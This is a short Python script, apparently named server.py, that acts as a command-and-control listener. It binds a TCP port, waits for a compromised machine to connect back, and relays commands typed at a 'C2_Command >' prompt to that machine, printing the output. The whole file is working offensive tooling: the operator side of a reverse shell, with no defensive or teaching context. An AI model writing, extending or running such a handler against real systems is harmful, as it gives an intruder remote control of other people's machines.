import socket
import sys

# 1. Default Definitions
Ip = "0.0.0.0"
Port = 8000

def main(targetIp = Ip, targetPort = Port):
    # 2. Create the socket
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    # 3. Bind and Listener
    try:
        print(f"[*] Staring the server on {targetIp}:{targetPort}...")
        server.bind((targetIp,targetPort))
        server.listen(5)
        print(f"[+]Listening...")
    except Exception as e:
        print(f"[-] Error binding: {e}")
        return

    # 4. Connection Accept
    clientSocket, clientAddress = server.accept()
    print(f"[+] Connection from {clientAddress[0]}:{clientAddress[1]}")

    try:
        initial_data = clientSocket.recv(1024).decode()
        print(initial_data)
    except Exception as e:
        print(f"[-] No greeting received: {e}")

    # 5. Executing command while server is running
    while True:
        try:
            command = input("C2_Command > ")
            if command.lower().strip() == 'exit':
                clientSocket.send(b"exit")
                break
            if command.strip() == "":
                continue

            clientSocket.send(command.encode())

            response = clientSocket.recv(8192).decode()
            print(response)

        except KeyboardInterrupt:
            print("\n[!] Exiting...")
        except Exception as e:
            print(f"[-] ERROR: {e}")
            break
    clientSocket.close()
    server.close()

if __name__ == "__main__":
    if len(sys.argv) == 1:  
        main()
        
    elif len(sys.argv) == 3:
        ip = sys.argv[1]
        try:
            port = int(sys.argv[2]) # convert string to int
            main(ip, port)
        except ValueError:
            print("[-] Error: Port must be an integer.")
            
    else:
        print("Usage: python3 server.py <IP> <PORT>")
        print("OR:    python3 server.py (uses default 0.0.0.0:8000)")
        sys.exit(1)
    